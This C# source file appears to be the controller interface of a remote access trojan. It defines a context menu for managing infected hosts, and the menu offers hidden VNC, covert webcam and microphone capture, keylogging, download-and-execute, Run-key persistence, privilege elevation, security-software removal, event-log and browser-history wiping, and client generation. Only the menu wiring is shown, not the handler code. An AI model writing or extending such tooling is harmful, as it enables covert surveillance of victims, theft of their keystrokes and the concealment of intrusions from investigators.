using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void initClientContextMenu()
        {
            contextMenuStripClient = new ContextMenuStrip();
            contextMenuStripClient.Closing += contextMenuStripClient_Closing;

            // === 常用功能（顶层直接项） ===
            contextMenuStripClient.Items.Add("查看屏幕(&S)", null, onMenuScreenCapture);
            contextMenuStripClient.Items.Add("查看摄像头(&V)", null, onMenuVideoCapture);
            contextMenuStripClient.Items.Add("语音监听(&L)", null, onMenuAudioCapture);
            contextMenuStripClient.Items.Add("文件管理(&F)", null, onMenuFileManager);

            // === 主机管理(H) → 子菜单 ===
            var menuHostManage = new ToolStripMenuItem("主机管理(&H)");
            menuHostManage.DropDownItems.Add("系统管理(&M)", null, onMenuSystemManager);
            menuHostManage.DropDownItems.Add("HVNC隐形桌面", null, onMenuHVNC);
            menuHostManage.DropDownItems.Add("高清屏幕", null, onMenuHDScreen);
            menuHostManage.DropDownItems.Add("后台屏幕(&G)", null, onMenuBackgroundScreen);
            menuHostManage.DropDownItems.Add("服务管理(&S)", null, onMenuServiceManager);
            menuHostManage.DropDownItems.Add("网络信息(&N)", null, onMenuNetworkInfo);
            menuHostManage.DropDownItems.Add("窗口管理(&W)", null, onMenuWindowManager);
            menuHostManage.DropDownItems.Add("主机信息(&I)", null, onMenuHostInfo);
            contextMenuStripClient.Items.Add(menuHostManage);

            // === 注册表编辑 ===
            contextMenuStripClient.Items.Add("注册表编辑(&E)", null, onMenuRegistry);

            // === 远程终端(T) → 子菜单 ===
            var menuTerminal = new ToolStripMenuItem("远程终端(&T)");
            menuTerminal.DropDownItems.Add("远程终端", null, onMenuRemoteTerminal);
            menuTerminal.DropDownItems.Add("执行代码", null, onMenuDownloadExec);
            contextMenuStripClient.Items.Add(menuTerminal);

            // === 远程交互(C) → 子菜单 ===
            var menuInteract = new ToolStripMenuItem("远程交互(&C)");
            menuInteract.DropDownItems.Add("远程聊天", null, onMenuRemoteChat);
            menuInteract.DropDownItems.Add("弹出消息框", null, onMenuMessageBox);
            menuInteract.DropDownItems.Add("娱乐功能", null, onMenuEntertainment);
            menuInteract.DropDownItems.Add("打开URL", null, onMenuOpenUrl);
            contextMenuStripClient.Items.Add(menuInteract);

            // === 系统控制(P) → 子菜单 ===
            var menuSysCtrl = new ToolStripMenuItem("系统控制(&P)");
            menuSysCtrl.DropDownItems.Add("写入启动项(注册表)", null, onMenuWriteStartup);
            menuSysCtrl.DropDownItems.Add("写入启动项(Run键)", null, onMenuWriteRunStartup);
            menuSysCtrl.DropDownItems.Add("重启资源管理器", null, onMenuRestartExplorer);
            menuSysCtrl.DropDownItems.Add("提升权限", null, onMenuElevatePrivilege);
            menuSysCtrl.DropDownItems.Add(new ToolStripSeparator());
            menuSysCtrl.DropDownItems.Add("切换代理", null, onMenuToggleProxy);
            menuSysCtrl.DropDownItems.Add("代理映射", null, onMenuProxyMapping);
            contextMenuStripClient.Items.Add(menuSysCtrl);

            // === 分隔线 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());

            // === 编辑备注 / 修改分组 ===
            contextMenuStripClient.Items.Add("编辑备注(&R)", null, onMenuChangeRemark);
            contextMenuStripClient.Items.Add("修改分组(&G)", null, onMenuChangeGroup);

            // === 会话管理(X) → 子菜单 ===
            var menuSession = new ToolStripMenuItem("会话管理(&X)");
            menuSession.DropDownItems.Add("注销主机(&L)", null, onMenuLogoff);
            menuSession.DropDownItems.Add("重启主机(&R)", null, onMenuReboot);
            menuSession.DropDownItems.Add("关机命令(&S)", null, onMenuShutdown);
            menuSession.DropDownItems.Add(new ToolStripSeparator());
            menuSession.DropDownItems.Add("卸载主机(&U)", null, onMenuUninstall);
            contextMenuStripClient.Items.Add(menuSession);

            // === 分隔线 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());

            // === 上传消盾 → 子菜单 ===
            var menuShield = new ToolStripMenuItem("上传消盾");
            menuShield.DropDownItems.Add("本地上传(&L)", null, onMenuLocalUpload);
            menuShield.DropDownItems.Add("显示打开(&N)", null, onMenuShowOpen);
            menuShield.DropDownItems.Add("隐藏打开(&H)", null, onMenuHiddenOpen);
            contextMenuStripClient.Items.Add(menuShield);

            // === TG工具 → 子菜单 ===
            var menuTgTools = new ToolStripMenuItem("TG工具");
            menuTgTools.DropDownItems.Add("TG SafeW打包", null, onMenuTgSafeWPackager);
            menuTgTools.DropDownItems.Add("TG助手", null, onMenuTgHelper);
            contextMenuStripClient.Items.Add(menuTgTools);

            // === 上传执行 / 下载更新 ===
            contextMenuStripClient.Items.Add("上传执行(&U)...", null, onMenuDownloadExec);
            contextMenuStripClient.Items.Add("下载更新(&D)...", null, onMenuDownloadUpdate);

            // === 键盘记录 → 子菜单 ===
            var menuKeylogger = new ToolStripMenuItem("键盘记录");
            menuKeylogger.DropDownItems.Add("开始键盘记录(&K)", null, onMenuKeyloggerStart);
            menuKeylogger.DropDownItems.Add("停止键盘记录", null, onMenuKeyloggerStop);
            contextMenuStripClient.Items.Add(menuKeylogger);

            // === 分隔线 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());

            // === 日志清理 → 子菜单 ===
            var menuLogClean = new ToolStripMenuItem("日志清理");
            menuLogClean.DropDownItems.Add("清除所有日志", null, onMenuClearAllLogs);
            menuLogClean.DropDownItems.Add("清除系统日志", null, onMenuClearSystemLog);
            menuLogClean.DropDownItems.Add("清除安全日志", null, onMenuClearSecurityLog);
            menuLogClean.DropDownItems.Add("清除应用程序日志", null, onMenuClearApplicationLog);
            contextMenuStripClient.Items.Add(menuLogClean);

            // === 浏览器清理 → 子菜单 ===
            var menuBrowserClean = new ToolStripMenuItem("浏览器清理");
            menuBrowserClean.DropDownItems.Add("清除IE", null, onMenuClearIE);
            menuBrowserClean.DropDownItems.Add("清除Chrome", null, onMenuClearChrome);
            menuBrowserClean.DropDownItems.Add("清除Firefox", null, onMenuClearFirefox);
            menuBrowserClean.DropDownItems.Add("清除360", null, onMenuClear360);
            menuBrowserClean.DropDownItems.Add("清除QQ", null, onMenuClearQQ);
            menuBrowserClean.DropDownItems.Add("清除Skype", null, onMenuClearSkype);
            menuBrowserClean.DropDownItems.Add("清除搜狗", null, onMenuClearSogou);
            contextMenuStripClient.Items.Add(menuBrowserClean);

            // === 分隔线 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());

            // === 信息操作 ===
            contextMenuStripClient.Items.Add("复制IP", null, onMenuCopyIP);
            contextMenuStripClient.Items.Add("复制所有信息", null, onMenuCopyAllInfo);
            contextMenuStripClient.Items.Add("复制主机分享信息", null, onMenuCopyHostShareInfo);
            contextMenuStripClient.Items.Add("导出IP列表", null, onMenuExportIPList);
            contextMenuStripClient.Items.Add("导出主机分享信息", null, onMenuExportHostShareInfo);

            // === 分隔线 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());

            // === 查找与筛选 ===
            contextMenuStripClient.Items.Add("筛选主机", null, onMenuFilterHosts);
            contextMenuStripClient.Items.Add("查找进程", null, onMenuFindProcess);
            contextMenuStripClient.Items.Add("查找窗口", null, onMenuFindWindow);
            contextMenuStripClient.Items.Add("清除查找", null, onMenuClearFind);

            // === 分隔线 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());

            // === 批量操作 ===
            contextMenuStripClient.Items.Add("全选主机", null, onMenuSelectAll);
            contextMenuStripClient.Items.Add("取消全选", null, onMenuDeselectAll);

            // === 分隔线 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());

            // === 控制端菜单（含生成客户端、副控） ===
            AddControllerContextMenuItems();

            // === 分隔线 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());

            // === 帮助信息 ===
            contextMenuStripClient.Items.Add("受限功能说明", null, onMenuShowRestrictedFeatures);

            this.treeView1.ContextMenuStrip = null;
        }

        private void contextMenuStripClient_Closing(object sender, ToolStripDropDownClosingEventArgs e)
        {
            // 不再阻止菜单关闭，点击空白处正常收回菜单
        }

        private void ShowClientContextMenu(Control owner, Point location, SocketSession session)
        {
            if (contextMenuStripClient == null || owner == null)
                return;

            // 右键点击空白处不弹出菜单
            if (session == null)
                return;

            this.currentSession = session;
            UpdateSelectedClientInfo(session);
            if (RSCApplication.oRemoteControlServer != null)
                RSCApplication.oRemoteControlServer.SelectClient(session.SocketId);

            contextMenuStripClient.Show(owner, location);
        }

        // ---- 主机功能 事件处理 ----
    }
}
